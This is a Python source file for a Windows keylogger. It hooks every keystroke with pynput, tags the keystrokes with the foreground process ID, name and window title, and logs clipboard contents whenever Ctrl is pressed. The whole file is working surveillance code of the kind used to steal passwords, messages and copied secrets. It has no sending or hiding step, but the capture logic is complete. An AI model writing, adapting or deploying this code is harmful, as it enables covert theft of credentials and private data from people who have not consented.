from pynput import keyboard
from ctypes import *
from ctypes.wintypes import *
import win32clipboard


proc_status = None
clipboard_value = None
string = ""

def get_name_by_pid(pid):
    PROCESS_ALL_ACCESS = 0x1f0fff

    hProcess = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if hProcess == 0:
        return None

    buf = ctypes.create_unicode_buffer(1024)
    ret = ctypes.windll.psapi.GetModuleBaseNameW(hProcess, 0, buf, len(buf))
    if ret == 0:
        return None
    return buf.value


def get_hwnd_n_pid():
    hwnd = windll.user32.GetForegroundWindow()
    pid = ctypes.c_ulong()
    windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    return hwnd, pid.value


def get_window_title(hwnd, pid):
    length = windll.user32.GetWindowTextLengthW(hwnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hwnd, buf, length+1)
    return buf.value


def get_clipboard():
    win32clipboard.OpenClipboard()
    paseted_value = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return paseted_value




def on_press(key):
    global proc_status
    global clipboard_value
    global string

    try:
        hwnd, pid = get_hwnd_n_pid()
        pid_name = get_name_by_pid(pid)
        window_title = get_window_title(hwnd, pid)

        if proc_status == window_title:
            pass
        else:
            string += "PID : {} - [{}] - [{}] \n".format(pid, pid_name, window_title)

            proc_status = window_title
        string += "{} ".format(key.char)

    except AttributeError:

        if key.name == "shift" or key.name == "alt_l":
            string += "[{}] \n".format(key.name)


        elif key.name == "ctrl_l" or key.name == 'ctrl_r':
            string += "{} \n".format(key.name)
            paseted_value = get_clipboard()
            if clipboard_value != paseted_value:
                clipboard_value = paseted_value
                string += "ClipBord: {} \n".format(clipboard_value)

        else:
            string += "[{}] \n".format(key.name)

def on_release(key):
    if key == keyboard.Key.esc:
        return False


def run():
    with keyboard.Listener(
            on_press = on_press,
            on_release = on_release) as listener:
        listener.join()

    return string
